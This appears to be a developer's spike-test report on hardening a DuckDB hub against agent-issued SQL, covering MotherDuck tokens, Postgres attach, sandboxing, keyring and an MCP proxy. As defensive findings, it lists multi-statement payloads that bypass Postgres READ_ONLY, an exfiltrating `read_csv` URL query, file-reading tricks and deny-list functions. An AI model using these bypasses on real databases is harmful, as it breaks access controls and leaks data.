# Spike #107 findings: DuckDB 1.4.1 hub

Part of epic #105. Pins plan §4.4/§4.5 of `workspaces-and-connections.md`. Engine: go-duckdb v2.4.3, DuckDB 1.4.1, Postgres 16 (podman), Fedora/GNOME Secret Service.

Probes live in `internal/session/*_spike_test.go`, with `doc.go` as the placeholder package.

- Default `go test ./...` runs the offline probes only (about 3 s).
- `-tags integration` needs network (INSTALL of extensions) and a container runtime for Postgres. Full run is about 20 s.
- `-tags keyring` uses the real Secret Service.
- `MOTHERDUCK_TOKEN` unset skips the real-token MotherDuck test. `SPIKE_MD_SSO=1` enables two ~60 s subtests that reproduce the SSO hang.

Each item below gives the answer, the evidence (test name) and the implication.

## 1. Hardening options at open

**Answer.** go-duckdb's DSN query string accepts all six options, and the values read back through `current_setting`:

- `allow_persistent_secrets`
- `autoinstall_known_extensions`
- `autoload_known_extensions`
- `allow_community_extensions`
- `temp_directory`
- `lock_configuration`

DSN options are strings only, and some are silently ignored: `secret_directory` is accepted but reads back the default, so it needs `SET` (default `~/.duckdb/stored_secrets`; the probe sets it to a temp dir and asserts the secret file lands there). The session must read back every hardening option after open and fail closed. A LIST option such as `allowed_directories` is rejected in the DSN ("invalid or local option for global database config"). An unknown option is rejected at open ("options were not recognized").

All five non-lock options can also be set with `SET` on a fresh instance. After the secret manager has been used (any `CREATE SECRET`), only `allow_persistent_secrets` fails:

> Changing Secret Manager settings after the secret manager is used is not allowed!

The other four options still accept `SET` after that point.

`allow_persistent_secrets=false` makes `CREATE PERSISTENT SECRET` fail. The default (true) writes the secret to disk under `secret_directory` (default `~/.duckdb/stored_secrets`).

`lock_configuration=true` blocks every later `SET`/`PRAGMA` write ("the configuration has been locked").

It does **not** block any of the following:

- `ATTACH`/`DETACH`
- `CREATE`/`DROP SECRET`
- `INSTALL`/`LOAD`
- `SET VARIABLE`
- `USE`

Evidence:

- `TestSpikeHardeningDSN`
- `TestSpikeHardeningSET`
- `TestSpikeHardeningAfterSecretManager`
- `TestSpikeLockConfigurationDoesNotBlockAttachOrSecret`
- `TestSpikeExtensionsAndHardening/lock_configuration_does_not_stop_INSTALL/LOAD` (integration)

Implications:

- Pass the hardening as DSN params (one string), not as per-connection init `SET`s. A pooled second connection would run its init after the secret manager is used and fail on `allow_persistent_secrets`.
- Do the other `SET`s on the first connection, then `lock_configuration=true` last. Locking in the DSN prevents later `SET allowed_directories`/`enable_external_access`.
- The plan's reviewer claim is confirmed. The SQL policy must deny `INSTALL`/`LOAD`/`ATTACH`/secret DDL itself.
- The instance-level ATTACH/secret and per-connection `USE` claims in §4.4 are re-confirmed by `TestSpikeInstanceVsConnectionScope`.

## 2. Cross-process file lock

**Answer.** Confirmed with real subprocesses. These combinations fail with `Could not set lock on file ... Conflicting lock is held in <exe> (PID n)`:

- RW holder + RO attach
- RW holder + RW attach
- RO holder + RW attach

The RO + RO combination works. The lock is released when the holder exits.

Evidence: `TestSpikeFileLockCrossProcess`.

Implication: the single-hub design is required. The error text carries the holder's PID and executable, so the `locked-by(pid)` status can be parsed from it (best-effort; the `hub.lock` flock stays the primary source). The RO-attach error for an RW lock holder does not mention a read-only fallback.

## 3. MotherDuck

**Answers** (fake-token and no-token probes, `TestSpikeMotherDuckFakeToken`; the real-token probes are written but skipped here, `TestSpikeMotherDuckRealToken`):

- **`CREATE SECRET (TYPE motherduck, TOKEN ...)` does not work on 1.4.1.** After `INSTALL`/`LOAD motherduck` it fails with "Secret type 'motherduck' not found".
- **Token as a DSN option at open is rejected.** `motherduck_token` is only a known option after the extension loads, so the plan's "must be present at open (connector config)" is wrong.
- **Working token paths:**
  - the `motherduck_token` environment variable (process-wide);
  - `INSTALL` + `LOAD motherduck`, then `SET motherduck_token='...'` on the instance, before `ATTACH` and before `lock_configuration`.
- **A token in the `md:` connection string is ignored.** Do not use `ATTACH 'md:db?motherduck_token=...'`.
- **No token anywhere is dangerous.** `ATTACH 'md:...'` starts an interactive SSO flow: it tries to open a browser, prints a login URL to stdout, and blocks about 60 s. Reproduce with `SPIKE_MD_SSO=1`.
- **Redaction.** After `SET`, the token shows as `<redacted>` in `current_setting('motherduck_token')` and `duckdb_settings()`.
- **A bad token does not echo the token.** The error is "Request failed: Your request is not authenticated ... (Jwt header is an invalid JSON ...)".
- **Not verified (needs a real token):** `attach_mode=single` behaviour, and what a second distinct token does in one process. Both are written in `TestSpikeMotherDuckRealToken` for a token holder.

Implications:

- The session must never `ATTACH` an `md:` catalog unless a token has been `SET`. Otherwise it hangs the app on a browser flow. Needs-credentials is decided before any dial.
- Run `SET motherduck_token` (not env) once on the hub after LOAD and before the lock. Env would leak into every child process.
- The "one MotherDuck account per process" constraint is unverified. Keep the plan's single-account design and the relaunch prompt until the real-token test runs.

## 4. Postgres

**Answers** (`TestSpikePostgres*`, integration):

- **Secret-based attach works:** `CREATE TEMPORARY SECRET pgs (TYPE postgres, HOST, PORT, DATABASE, USER, PASSWORD)` followed by `ATTACH '' AS pg (TYPE postgres, SECRET pgs, READ_ONLY)`.
- **`duckdb_databases().path` is empty** for a secret-based attach (row `pg|postgres||true`). An inline-DSN attach puts the whole connection string, password included, in `path`.
- **Hardened hubs reject inline attach.** With `allow_persistent_secrets=false`, secret-less or unknown-secret attach fails with the misleading "Unknown secret storage found: 'local_file'". The session must translate that message.
- **Native `INSERT`/`CREATE` on a `READ_ONLY` catalog fail** in DuckDB.
- **`postgres_execute` does not bypass `READ_ONLY` for a single statement.** It runs inside `BEGIN ... READ ONLY` on the server, which rejects the write.
- **`postgres_execute` multi-statement payloads escape it.** Four of the five attempts created tables in Postgres despite `READ_ONLY`:
  - `ROLLBACK; CREATE ...`
  - `COMMIT; CREATE ...`
  - `SET TRANSACTION READ WRITE; CREATE ...`
  - `END; BEGIN READ WRITE; CREATE ...; COMMIT`

  The fifth (`SET SESSION CHARACTERISTICS ...`) errored.
- **`postgres_query` is wrapped in `COPY (...)`.** A data-modifying CTE is rejected, but it can read server metadata (version, user, address) and call functions such as `pg_sleep`.
- **`postgres_scan(inline dsn, ...)` is a credential passthrough** that works on a hardened hub.
- **Credential leakage: wrong password and unreachable host both echo the password in the error.** Example:

  > IO Error: Unable to connect to Postgres at user='postgres' password='WRONGpw_needle_5521' host='127.0.0.1' ...

  The same happens after a password rotation. `duckdb_secrets()` shows `password=redacted`, and `redact=false` is disabled.
- **Catalog cache is stale until cleared.** A table created in Postgres after `ATTACH` is not listed by `duckdb_tables()`, though a direct query of it works. `CALL pg_clear_cache()` refreshes it.

Implications:

- `postgres_execute`, `postgres_query`, `postgres_scan` and `postgres_attach` stay on the deny list. `postgres_execute` is a real read-only bypass, not just a classifier gap.
- The §4.3 error redactor is mandatory. It must match `password='...'` and the literal secret values from DuckDB errors before logs, UI and agent. The pattern is stable in 1.4.1 (`password='` is asserted in the test).
- Use only secret-based attach. Never put an inline DSN in a connection string.
- Project `duckdb_databases()` without `path` (still correct, but defence in depth).
- The schema cache needs an explicit invalidate that calls `pg_clear_cache()` (a `CALL` the session issues itself, not the agent).

## 5. External access, `allowed_directories`, INSTALL/httpfs

**Answers** (`TestSpikeExternalAccessOffAndAllowedDirectories`, offline; `TestSpikeExtensionsAndHardening` and `TestSpikeExternalAccessOffStillAttachesRemote`, integration):

- `allowed_directories` cannot be set in the DSN, only with `SET`.
- `enable_external_access=false` can be set in the DSN, but then `SET allowed_directories` fails ("Cannot change allowed_directories when enable_external_access is disabled").
- Order must be `SET allowed_directories=[...]` first, then `SET enable_external_access=false`. After that the sandbox is irreversible ("Cannot change enable_external_access setting while database is running").
- With the sandbox on, the following are denied outside the allowed directories, including `../` traversal:
  - `read_*`
  - `glob`
  - replacement scans
  - `COPY ... TO`
  - `ATTACH` of a file
- `INSTALL` fails (it needs the extension and home directories). `LOAD` of an already-loaded extension is a no-op. A fresh `LOAD` fails with "Loading external extensions is disabled".
- A preloaded httpfs cannot read an https URL once the sandbox is on.
- **`ATTACH TYPE postgres` after lockdown fails** ("Attaching Postgres databases is disabled through configuration"). A catalog attached before lockdown keeps working. A `CREATE SECRET` after lockdown succeeds, but without an extension to use it with and no S3 access it does nothing useful.
- `allow_community_extensions=false` gates `LOAD`, not `INSTALL`: `INSTALL h3 FROM community` succeeds, `LOAD h3` fails (unsigned), and the setting cannot be raised after open.
- With autoload off, a URL read without `LOAD httpfs` fails with "requires the extension httpfs to be loaded". Autoload is off by default in the hardened config.

Implications:

- D13's "second agent-only hub with external access off" is feasible only as an eager hub: attach every non-file connection first, then lock. No lazy attach, no `data/` access, no httpfs/storage connections, and none of the `INSTALL`-on-demand UX. Keep it as a follow-up.
- Install extensions (with consent) before the sandbox or lock steps. In the hub there is no sandbox; the classifier is the gate.

## 6. What the agent policy must know

Evidence: `TestSpikeFileReadingSurfaces`, offline.

Readers that touch the local filesystem or a URL (all worked unrestricted, including through a CTE, a `TEMP MACRO` and a `TEMP VIEW`):

- `read_csv`, `read_csv_auto`, `sniff_csv`
- `read_text`, `read_blob`
- `read_json`, `read_json_auto`, `read_json_objects`, `read_ndjson`
- `read_parquet`, `parquet_scan`, `parquet_metadata`, `parquet_schema`, `parquet_file_metadata`, `parquet_kv_metadata` (`parquet_bloom_probe` also exists but was not probed)
- `glob`
- `read_text('file://...')`

Other file surfaces:

- **Replacement scans are file reads with no function call.** `SELECT * FROM 'x.csv'` and `FROM 'x.parquet'` read the file. `.duckdb` and unknown extensions are rejected.
- **File-side statements:** `COPY ... FROM`, `COPY ... TO`, `EXPORT DATABASE` and `ATTACH 'file'` all work unrestricted.
- **Table functions that run SQL from strings** (a classifier bypass): `query`, `query_table`, `json_execute_serialized_sql`.
- **Table functions the allow-list should name explicitly** (1.4.1 has 82; the full list is logged by the test):
  - metadata: `duckdb_*`, `pragma_*`
  - secrets and settings: `which_secret`, `duckdb_secrets`, `duckdb_settings`
  - maintenance and logging: `checkpoint`/`force_checkpoint`, `enable_logging`/`duckdb_logs`/`truncate_duckdb_logs`
- **Settings that read back:** `current_setting('home_directory')` and `duckdb_settings()` work. `getenv` does not exist in 1.4.1.
- **`DESCRIBE`/`EXPLAIN` on an attached Postgres catalog are not remote round trips** after attach. They issued 0 server statements.
- **`SUMMARIZE` is O(table):** it issued `BEGIN` / `COPY (SELECT <all columns> FROM table) TO STDOUT` / `COMMIT`, a full-table transfer. `SELECT count(*)` and `LIMIT 10` also open a transaction and a `COPY`, 3 statements each.

Implications:

- Allow-listing must be on the plan operator and function name, not on the statement text. This is why the EXPLAIN plan-operator allow-list stays.
- Treat a bare string `FROM 'path'` as a file read.
- Add `query`, `query_table`, `json_execute_serialized_sql` and `read_*`-by-replacement-scan to the denied/allow-listed set.
- Route agent `SUMMARIZE` on a remote catalog through a row cap, or run it on a bounded sample, or refuse it. Prefer cached `DESCRIBE`.

## 7. Introspection cost against about 500 Postgres tables

Evidence: `TestSpikePostgresIntrospectionCost`, 500 tables plus a 200k-row table, local container (so no WAN latency).

| Operation | Time | Server statements |
|---|---|---|
| `ATTACH` | 6 ms | 1 |
| `duckdb_tables()`, first call | 21 ms | 2 |
| `duckdb_tables()` / `information_schema.tables`, later | 4 to 6 ms | 2 |
| `information_schema.columns` / `duckdb_columns()` | 3 to 5 ms | 0 |
| `SHOW ALL TABLES` | 11 ms | 2 |
| `DESCRIBE` | 1 ms | 0 |
| `SUMMARIZE` (200k rows) | 65 ms | 3 (full COPY) |

Implications:

- Listing is cheap: 2 round trips per call, 0 for columns. At 50 to 100 ms RTT that is 100 to 200 ms.
- The first listing (2 statements) re-runs on every call (`duckdb_tables()` stays at 2 statements warm). It is therefore worth caching in the session, keyed by fingerprint, with an explicit refresh (`pg_clear_cache()`). The schema cache can be simple.
- The result also includes Postgres's own system schemas (710 rows for 501 user tables); filter `pg_catalog`/`information_schema`.
- The expensive and unbounded operation is data access, not the catalog: `SUMMARIZE`, and `count(*)` on very large tables.

## 8. go-keyring

Evidence: `TestSpikeKeyringRoundTrip`, `TestSpikeKeyringWithoutSessionBus` (tag `keyring`). go-keyring v0.2.6 is added to `go.mod` (test-only for now).

**Linux (Secret Service on this Fedora/GNOME box):**

- Set, Get and Delete work in 1 to 10 ms. Set overwrites in place. Multi-line, unicode, quotes and a 3 KiB value round-trip.
- Get and Delete of a missing item return `keyring.ErrNotFound`.
- With `DBUS_SESSION_BUS_ADDRESS` unset (and even with `XDG_RUNTIME_DIR`, `DISPLAY` and `WAYLAND_DISPLAY` also unset) it still worked, because godbus falls back to `/run/user/<uid>/bus`. SSH into an account with a running user session therefore works.
- An unreachable bus (`DBUS_SESSION_BUS_ADDRESS=unix:path=/nonexistent/bus`) returns a plain dial error immediately, not `ErrNotFound`.
- Reading the library source shows a locked login collection calls `Unlock`, then waits on `<-promptSignal` with **no timeout**. With no GUI prompter (SSH, headless) that blocks forever. This path is not reproducible on this machine.

**macOS (source only, not tested):** go-keyring shells out to `/usr/bin/security`.

- It uses `find-generic-password -s svc -wa user` for Get and `security -i` with the command on stdin for Set. The secret is passed via stdin, not argv, base64-prefixed, with a 4096-byte limit (`ErrSetDataTooBig`).
- No app signature is involved, so an unsigned build works. The ACL belongs to `/usr/bin/security`, not the Studio binary, so any process able to run `security` as the user can read the item (with the keychain unlocked).

**Not tested:** KDE (the same Secret Service API through KWallet's bridge), `wails dev` from an agent shell (godbus's uid fallback suggests it works), and Windows (Credential Manager via wincred, newly pulled in).

Implications:

- Wrap every keyring call in a timeout (about 5 s) in its own goroutine. On timeout or any non-`ErrNotFound` error, report `needs-credentials / keychain unavailable` and name the `env:` alternative.
- Key items as service `vibe`, user `<workspace-id>/<connection>`.
- "No plaintext fallback" is unchanged.

## 9. MCP stdio to SSE proxy

Evidence: `TestSpikeMCPStdioToSSEProxy`, offline.

**Answer.** mcp-go v0.44.1 has no ready-made stdio-to-SSE bridge, but it has all the parts:

- `client/transport.NewSSE(url, WithHeaders({"Authorization": "Bearer <token>"}))`, with `SendRequest`, `SendNotification` and `SetNotificationHandler`;
- `server.StdioServer`, already used by `ServeStdio`.

A 25-line raw JSON-RPC pass-through (read line, forward over the SSE transport, write the response) drove the real `internal/mcp` server end to end:

- `initialize`, `notifications/initialized`, `tools/list` (24 tools) and `tools/call` all reached the Studio-side handler.
- A wrong token returns `401` on connect. A request with an `Origin` header is refused with `403` even with the right token (Go's HTTP client sends none).
- Stdin EOF ends the proxy cleanly.
- When Studio exits, the next request fails with a connection-refused error. The prototype returns it and exits, so the real proxy must turn it into a JSON-RPC error and exit non-zero.

Implications:

- Token handoff: Studio's token is regenerated at every `Start`. It must be written (mode 0600) next to `hub.lock` along with the port, and re-read by the proxy on connect. The token must never go on the command line.
- The proxy is cheap. Use the raw pass-through rather than a mirror of tool definitions, so tool lists cannot drift.
- Lifecycle:
  - the proxy ends with stdin;
  - a dead upstream means an error plus exit;
  - Studio must not be asked to quit by the proxy.

## Reviewer findings (spike #107 review)

Found by the adversarial review. Each is reflected in plan §4.4/§4.5 as "(spike #107 review)" and feeds the agent SQL policy (#116).

- **A. `EXPLAIN ANALYZE` executes the statement.** INSERT, CTAS and `COPY TO` all ran. Deny it, or classify by the inner statement.
- **B. The classifier's own `EXPLAIN` has side effects.** Binding sniffs files and sends HTTP HEAD: `EXPLAIN SELECT * FROM read_csv('https://…/leak?q=secret')` made the request. Agent SQL needs a syntactic AST pre-check (`json_serialize_sql`) before any `EXPLAIN`.
- **C. EXPLAIN never shows paths, and paths can be computed** (`getvariable`, concatenation inside `query()`, lists). "File reads only inside `data/`" needs AST checks that allow literal paths only, or no agent file readers at all. EXPLAIN does reveal operators inside `query('…')`.
- **D. `SET VARIABLE` runs subqueries.** `SET VARIABLE v=(SELECT content FROM read_text('/etc/hostname'))` worked, so it cannot be blanket-allowed in every tier.
- **E. More file-read forms:**
  - `DESCRIBE`/`SHOW`/`SUMMARIZE`/`PIVOT`/`UNPIVOT` on `'<file>'`;
  - CTAS and `INSERT … FROM 'f'`;
  - `CALL read_text` and `CALL glob`;
  - `COPY FROM DATABASE`;
  - `LOAD '<path>'` and `INSTALL '<path>'` with arbitrary paths.
- **F. Missing table functions.**
  - Core: `read_ndjson_auto`, `read_ndjson_objects`, `read_json_objects_auto`, `parquet_bloom_probe`, `duckdb_variables`, `duckdb_external_file_cache`, `duckdb_temporary_files`, `sql_auto_complete`.
  - Extension-provided: `read_xlsx`, `st_read`/`st_read_meta`, `iceberg_*`, `delta_scan`, `sqlite_*`, `mysql_*`, ducklake.
  - `read_csv` globs work; a bare `FROM 'glob*'` fails.
- **G. Pin an app-private `extension_directory`.** `~/.duckdb/extensions` on the reviewer's machine already held `excel`, `ui`, `vss`, `fts`, httpfs and `postgres_scanner`, all loadable.
- **H. Ambient MotherDuck env token.** `MOTHERDUCK_TOKEN`/`motherduck_token` is picked up at `LOAD` and is invisible to `current_setting`. Unset both before `LOAD motherduck`, or treat them as an explicit `env:` source.
- **I. MotherDuck SSO corrupts stdio.** It prints to process stdout and tries to open a browser; under `vibe mcp serve` that corrupts the JSON-RPC stream. Never attempt `md:` without a token.
- **J. Silently ignored DSN options.** `secret_directory` confirmed. Read back every hardening option after open and fail closed.
- **K. `READ_ONLY` is client-side only.** Steer users to read-only database roles. `postgres_query` can call side-effecting functions (`pg_sleep`, `pg_terminate_backend`), so deny it outright.

## Test hygiene

Default-tag probes are offline-safe and never write to `$HOME`: `openDSN` forces autoinstall/autoload off and a temp `extension_directory`, and the only secret type used is core `http`. Persistent-secret probes `SET secret_directory` to a temp dir.
